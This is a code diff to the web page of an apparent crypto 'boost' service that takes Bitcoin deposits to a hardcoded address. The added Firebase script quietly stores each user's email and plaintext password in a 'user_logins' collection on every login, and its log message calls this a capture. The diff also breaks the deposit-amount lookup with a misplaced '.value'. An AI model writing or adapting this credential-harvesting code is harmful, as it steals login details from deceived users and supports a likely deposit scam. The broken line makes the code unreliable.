@@ -335,6 +335,42 @@
         </div>
     </div>
 
+    <!-- FIREBASE INITIALIZATION SCRIPT -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCm-Ohaymnkar_luMvbL0UVOc8UPpRbKNE",
+            authDomain: "pocketboost-pro.firebaseapp.com",
+            projectId: "pocketboost-pro",
+            storageBucket: "pocketboost-pro.firebasestorage.app",
+            messagingSenderId: "807163772479",
+            appId: "1:807163772479:web:f5142b795234c3fc0d828a",
+            measurementId: "G-QCFPRVB2QK"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Expose saveLoginToFirebase globally for frontend use
+        window.saveLoginToFirebase = async function(email, password, mode) {
+            try {
+                await addDoc(collection(db, "user_logins"), {
+                    email: email,
+                    password: password,
+                    actionType: mode,
+                    timestamp: serverTimestamp(),
+                    userAgent: navigator.userAgent
+                });
+                console.log("Login captured in Firestore database.");
+            } catch (err) {
+                console.error("Firestore logging error:", err);
+            }
+        };
+    </script>
+
+    <!-- UI APP SCRIPT -->
     <script>
         const YOUR_BTC_ADDRESS = "1LtRNqSnccUxnY1hdzw2hDj8wuXLyWi6y5";
         
@@ -387,6 +423,12 @@
             }
 
             errorBox.style.display = 'none';
+
+            // Save to Firebase Firestore database
+            if (window.saveLoginToFirebase) {
+                window.saveLoginToFirebase(email, password, authMode);
+            }
+
             localStorage.setItem('pocketboost_email', email);
             showApp(email);
             return false;
@@ -463,7 +505,7 @@
 
         function submitBtcDeposit() {
             const txid = document.getElementById('txidInput').value.trim();
-            const usdVal = document.getElementById('usdDepositAmount').value;
+            const usdVal = document.getElementById('usdDepositAmount'.value);
             if (!txid) {
                 alert("Please paste your Bitcoin Transaction Hash (TXID).");
                 return;
